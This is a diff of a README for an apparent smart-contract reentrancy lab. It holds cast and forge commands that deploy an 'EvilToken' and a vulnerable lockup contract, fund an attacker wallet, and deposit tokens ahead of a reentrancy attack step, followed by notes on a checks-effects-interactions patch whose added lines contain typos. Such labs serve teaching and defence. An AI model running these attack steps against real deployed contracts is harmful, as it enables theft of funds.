@@ -114,7 +114,7 @@ This project intentionally uses cast send to simulate a REAL attacker interactio
 
 1️⃣ Deploy EvilToken
 
-TOKEN=$(forge create src/EvilToken.sol:EvilToken \
+TOKEN=$(forge create src/EvilToken.sol:EvilToken --broadcast \
   --rpc-url $RPC \
   --private-key $DEPLOYER_PK \
   | grep "Deployed to:" | awk '{print $3}')
@@ -131,7 +131,7 @@ cast code $TOKEN
 
 UNLOCK_TIME=$(($(date +%s) - 10))
 
-LOCKUP=$(forge create src/LockupVulnerable.sol:LockupVulnerable \
+LOCKUP=$(forge create src/Lockup.sol:Lockup --broadcast \
   --rpc-url $RPC \
   --private-key $DEPLOYER_PK \
   --constructor-args $TOKEN $TOKEN $UNLOCK_TIME \
@@ -174,23 +174,32 @@ cast send $TOKEN \
   --private-key $DEPLOYER_PK \
   --rpc-url $RPC
 
+Next...
 
+ATTACKER_ADDR=$(cast wallet address --private-key $ATTACKER_PK)
+
+cast send $TOKEN \
+ "transfer(address,uint256)" \
+$ATTACKER_ADDR 100000000000000000000 \
+--private-key $DEPLOYER_PK \
+--rpc-url $RPC
+
+cast call $TOKEN \
+ "balanceOf(address)" \
+$ATTACKER_ADDR\
+ --rpc-url $RPC
 ---
 
 6️⃣ Register Deposit
+cast send $TOKEN "approve(address,uint256)"  $LOCKUP 100000000000000000000 \
+  --private-key $ATTACKER_PK \
+  --rpc-url $RPC
 
 cast send $LOCKUP \
   "deposit(uint256)" \
   100000000000000000000 \
   --private-key $ATTACKER_PK \
   --rpc-url $RPC
----
-OR 
----
-
-cd script
-chmod +x ./script.sh
-./script.sh
 ---
 
 7️⃣ Enable Reentrancy Attack
@@ -251,6 +260,8 @@ Attacker balance increases beyond intended withdrawal amount
 🛡️ Patched Version
 
 The safe implementation follows CEI:
+Checks-Effectss-Interaction alone is sufficient here.
+nonRenentrantrant provides defense-in-depth.
 
 balances[msg.sender] = 0;
 require(token.transfer(msg.sender, amount), "transfer failed");
